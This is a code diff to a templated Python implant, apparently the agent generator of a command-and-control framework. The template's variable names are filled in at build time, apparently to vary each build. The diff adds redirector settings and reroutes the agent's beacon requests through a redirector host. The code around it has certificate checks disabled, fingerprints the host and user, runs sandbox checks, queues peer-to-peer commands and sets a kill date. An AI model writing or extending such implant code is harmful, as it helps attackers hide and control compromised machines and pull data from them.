@@ -79,7 +79,7 @@ class {class_name}:
         self.{v_hostname} = socket.gethostname()
         self.{v_username} = os.getenv('USER') or os.getenv('USERNAME') or 'unknown'
         self.{v_os_info} = platform.system() + " " + platform.release()
-        
+
         self.{v_secret_key} = None  # Will be set during registration
         self.{v_fernet} = None     # Fernet instance for encryption/decryption
 
@@ -91,6 +91,11 @@ class {class_name}:
         self.{v_p2p_command_queue} = []  # Queue for forwarded commands
 
         self.{v_sandbox_enabled} = {sandbox_check_enabled}
+
+        # Redirector configuration
+        self.{v_redirector_host} = "{redirector_host}"
+        self.{v_redirector_port} = {redirector_port}
+        self.{v_use_redirector} = {use_redirector}
 
         # Working hours and kill date configurations
         self.{v_kill_date} = "{kill_date}"
@@ -137,7 +142,14 @@ class {class_name}:
 
     def {m_send}(self, method, uri_template, data=None):
         uri = uri_template.format(agent_id=self.{v_agent_id})
-        url = self.{v_c2} + uri
+
+        # Use redirector if enabled
+        if self.{v_use_redirector}:
+            protocol = "https" if self.{v_c2}.startswith("https") else "http"
+            url = protocol + "://" + self.{v_redirector_host} + ":" + str(self.{v_redirector_port}) + uri
+        else:
+            url = self.{v_c2} + uri
+
         try:
             if method.upper() == 'GET':
                 response = requests.get(url, headers=self.{v_headers}, timeout=30, verify=False)
@@ -145,7 +157,7 @@ class {class_name}:
                 response = requests.post(url, json=data, headers=self.{v_headers}, timeout=30, verify=False)
             else:
                 return None
-            
+
             if response.status_code == 200:
                 try:
                     return response.json()
@@ -153,7 +165,7 @@ class {class_name}:
                     return None
             else:
                 return None
-                
+
         except requests.exceptions.RequestException:
             return None
         except Exception:
